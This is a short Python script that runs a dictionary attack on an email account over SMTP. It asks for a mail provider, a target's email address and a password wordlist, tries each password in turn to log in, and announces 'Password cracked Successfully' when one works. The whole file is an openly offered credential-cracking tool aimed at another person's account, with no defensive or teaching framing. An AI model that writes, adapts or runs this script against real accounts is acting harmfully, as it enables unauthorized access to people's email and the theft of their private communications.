import smtplib

#establish a proper connection with server
web=raw_input("Enter website name: ")
web="smtp."+web
print("connecting to %s"%web)
smtpserver=smtplib.SMTP(web, 587)
smtpserver.ehlo()
smtpserver.starttls()

#open the dictionary file 
user=raw_input("Enter the target's email address: ")
passwdfile = raw_input("Enter the password file name :")
passwd=open(passwdfile,"r")

#perform dictionary attack on website
for password in passwd:
	try:
		smtpserver.login(user, password)
		print("Password cracked Successfully: %s"%password)
		break
	except smtplib.SMTPAuthenticationError:
		print("[!] Incorrect Password: %s"%password)
	
		

